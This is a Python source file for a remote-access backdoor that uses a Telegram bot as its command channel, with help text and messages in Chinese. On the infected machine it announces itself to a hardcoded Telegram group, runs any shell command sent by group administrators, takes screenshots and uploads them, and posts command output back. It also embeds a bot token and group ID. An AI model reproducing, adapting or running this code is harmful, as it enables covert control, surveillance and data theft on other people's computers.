import os, io
import re
import subprocess
import time
import uuid
import requests
import pyautogui
import platform


class CenterHandlerExec:
    def init(self):
        pass

    def get_platform(self):
        sys_platform = platform.platform().lower()
        if "windows" in sys_platform:
            return "windows"
        elif "linux" in sys_platform:
            return "linux"
        elif "macos" in sys_platform:
            return "macos"
        else:
            return "other"

    def screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            # img_byte_arr = img_byte_arr.getvalue()
            img_byte_arr.seek(0)
            return img_byte_arr, True
        except:
            return '', False

    def command_exec(self, command):
        command_shell = " ".join(command).lstrip(" ").replace("/", "\\")
        pf = re.search("^([a-zA-Z]:)", command[0])
        if command[0] == "cd" or pf:
            if pf:
                newdir = pf.group(1)
            else:
                newdir = "".join(command[1:]).lstrip(" ")

            try:
                os.chdir(newdir)
            except FileNotFoundError:
                return 404, f"报错如下：找不到目录 --> {command_shell}"
            except Exception as e:
                return 404, f"cd命令出错，错误信息如下：{e}"
        process = subprocess.Popen(command_shell, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        if output:
            return output.decode('gbk', errors='ignore')
        if error:
            return error.decode('gbk', errors='ignore')


class TGBotShell:
    def __init__(self, tgbot_token):
        self.TGBotToken = tgbot_token
        self.UUID = None
        self.tg_info = None
        self.ReConn_Max = 5
        self.ReConn_Time = 60
        self.ChatName = "@xiaokunyihaoBot"
        self.GroupID = "-1002035867279"
        self.UserID = {}
        self.offset = None
        self.CenterHandlerExec = CenterHandlerExec()

    def help(self):
        return f"""
目前支持命令如下：
    help                                                    查看帮助信息
    getuuids                                                查看所有存活主机信息
    <uuids> <shell options>                                 执行相关指令
    
    shell options选项如下：
        set uuid <new uuid>                                 设置新的uuid
        screenshot                                          截图
        upload <current filepath> <target filepath>         上传文件至指定目标地址
        download <target filepath> <current filepath>       上传文件至指定目标地址
        <shell命令>                                          执行相关系统命令
        
注意：群组中执行命令格式统一为 {self.ChatName} <支持的命令> <shell options>
"""
    def get_chat_members(self):
        try:
            data = requests.get(
                f"https://api.telegram.org/bot{self.TGBotToken}/getChatAdministrators?chat_id={self.GroupID}").json()
        except Exception as e:
            print(404, "发生错误：", e)
        else:
            if data["ok"] and 'result' in data:
                members = data['result']
                # 提取每个成员的用户ID
                for member in members:
                    if not member['user']['is_bot'] and member['user']['id'] not in self.UserID:
                        self.UserID[member['user']['id']] = member['user']["username"]
            else:
                print("Failed to get chat members.")

    def getUpdates(self):
        if self.offset is None:
            param = False
        else:
            param = {'offset': self.offset + 1, 'timeout': 30}
        try:
            response = requests.get(f"https://api.telegram.org/bot{self.TGBotToken}/getUpdates",
                                    params=param).json()
        except Exception as e:
            return 404, f"获取最新数据失败：{e}"
        else:

            if self.offset is None and response["ok"] and len(response['result']) > 0 and response['result'][-1][
                'update_id'] != "":
                self.offset = response['result'][-1]['update_id']
            if response["ok"] and len(response['result']) > 0:
                updates = []
                for item in response['result']:

                    if 'message' not in item:
                        message = item['edited_message']
                    else:
                        message = item['message']
                    if message['from']['is_bot'] is False and message['from'][
                        'id'] in self.UserID and "text" in message:
                        if message["chat"]["type"] == "supergroup":
                            matches = re.search(f"{self.ChatName}\s*(.*)", str(message['text']))
                        else:
                            matches = re.search(f"(.*)", str(message['text']))
                        if matches:
                            matches = matches.group(1).split(" ")
                            if matches[0].replace(" ", "") == str(self.UUID):
                                shell_text = ' '.join(matches[1:]).lstrip(" ")
                                updates.append({'chatid': message['chat']['id'],
                                                'username': [message['from']['id']],
                                                'text': shell_text})
                            elif matches[0].replace(" ", "") == 'getuuids':
                                updates.append({'chatid': message['chat']['id'],
                                                'username': [message['from']['id']],
                                                'text': 'getuuids'})
                            else:
                                updates.append({'chatid': message['chat']['id'],
                                                'username': [message['from']['id']],
                                                'text': 'help'})
                        self.offset = response['result'][-1]['update_id']
                return updates
            else:
                return False

    def send_chat_msg(self, updates):
        msg = ""
        for item_user in updates["username"]:
            msg += f"@{self.UserID[item_user]} "
        msg += "\n" + updates["text"]
        try:
            requests.post(
                f"https://api.telegram.org/bot{self.TGBotToken}/sendMessage?chat_id={updates['chatid']}&text={msg}")
        except:
            pass

    def send_chat_img(self, updates):
        msg = ""
        for item_user in updates["username"]:
            msg += f"@{self.UserID[item_user]} "
        msg += f"\n主机：{self.UUID}\n" + "screenshot命令执行成功！\n"
        try:
            files = {
                "filename": "screen.png",
                "Content-Type": "images/png",
                "photo": updates['img']
            }
            requests.post(
                f"https://api.telegram.org/bot{self.TGBotToken}/sendPhoto",
                params={"chat_id": updates['chatid'], "caption": msg}, files=files)
        except:
            pass

    def send_chat_file(self, updates, flag=0):
        msg = ""
        file = {'document': {}}
        header = {"Content-Type": "multipart/form-data"}
        if updates["success"]:
            if flag == 1:
                file['document']["screenshot.png"] = updates["img"]
                header["Content-Type"] = "images/png"
            elif flag == 2:
                file['document']["screenvideo.mp4"] = updates["video"]
                header["Content-Type"] = "video/mp4"
            elif flag == 3:
                file["file"] = updates["file"]
            else:
                file = None
        else:
            file = None
        for item_user in updates["username"]:
            msg += f"@{self.UserID[item_user]} "
        if updates["success"]:
            msg += f"\n主机：{self.UUID}\n" + "执行成功！结果如下：\n"
        else:
            msg += "\n" + "执行失败！"
        try:
            print("发送")
            print(file)
            print(header)
            requests.post(
                f"https://api.telegram.org/bot{self.TGBotToken}/sendPhoto?chat_id={updates['chatid']}&caption={msg}",
                files=file,
                headers=header)
        except:
            print("失败")
            pass

        # response = requests.post(f"https://api.telegram.org/bot{self.TGBotToken}/sendVideo",
        #                          params={"chat_id": self.tg_info["message"]["chat"]["id"]}, files=files,
        #                          headers={'Content-Type': 'video/mp4'}).json()
        # if response["ok"]:
        #     self.tg_info = response["result"]
        #     print(response)
        # else:
        #     print('发送失败')

    def handler_center(self, updates):
        for item_user in updates:
            cmd_list = str(item_user["text"]).split(" ")
            if cmd_list[0] == "help":
                self.send_chat_msg(
                    {"chatid": item_user["chatid"], "username": item_user['username'],
                     "text": self.help()})
            elif cmd_list[0] == "getuuids":
                self.send_chat_msg(
                    {"chatid": item_user["chatid"], "username": item_user['username'],
                     "text": f"主机：{self.UUID}\n状态：存活！"})
            elif cmd_list[0] == "set":
                if cmd_list[1] == "uuid":
                    self.UUID = cmd_list[2].replace(" ", "")
                    self.send_chat_msg(
                        {"chatid": item_user["chatid"], "username": item_user['username'],
                         "text": f"主机：{self.UUID}\n已成功更新UUID会话标识！"})
                else:
                    self.send_chat_msg(
                        {"chatid": item_user["chatid"], "username": item_user['username'],
                         "text": f"主机：{self.UUID}\n该命令 {cmd_list} 并不存在，请输入命令 help 后查看语法！"})
            elif cmd_list[0] == "screenshot":
                result, flag = self.CenterHandlerExec.screenshot()
                if flag:
                    self.send_chat_img(
                        {"chatid": item_user["chatid"], "username": item_user['username'], "img": result})
                else:
                    self.send_chat_msg(
                        {"chatid": item_user["chatid"], "username": item_user['username'],
                         "text": f"主机：{self.UUID}\n执行upload！"})
            elif cmd_list[0] == "upload":
                self.send_chat_msg(
                    {"chatid": item_user["chatid"], "username": item_user['username'],
                     "text": f"主机：{self.UUID}\n执行upload！"})
            elif cmd_list[0] == "download":
                self.send_chat_msg(
                    {"chatid": item_user["chatid"], "username": item_user['username'],
                     "text": f"主机：{self.UUID}\n执行download！"})
            elif cmd_list[0] == "getinfo":
                self.send_chat_msg(
                    {"chatid": item_user["chatid"], "username": item_user['username'],
                     "text": f"主机：{self.UUID}\n执行getinfo！"})
            else:
                result = self.CenterHandlerExec.command_exec(cmd_list)
                self.send_chat_msg(
                    {"chatid": item_user["chatid"], "username": item_user['username'],
                     "text": f"主机：{self.UUID}\n执行系统命令成功！\n{result}"})

    def main(self):
        self.UUID = uuid.uuid4()
        flag = False
        while True:
            self.get_chat_members()
            if not flag:
                flag = True
                self.send_chat_msg(
                    {"chatid": self.GroupID, "username": self.UserID, "text": f"新的主机上线！UUID：{self.UUID}"})
            updates = self.getUpdates()
            if updates:
                self.handler_center(updates)
            time.sleep(1)


if __name__ == '__main__':
    NewTgbot = TGBotShell(tgbot_token="7145600460:AAH8H9zt4jRe3Pog6WWfEUstiHFIvYI4ke8").main()
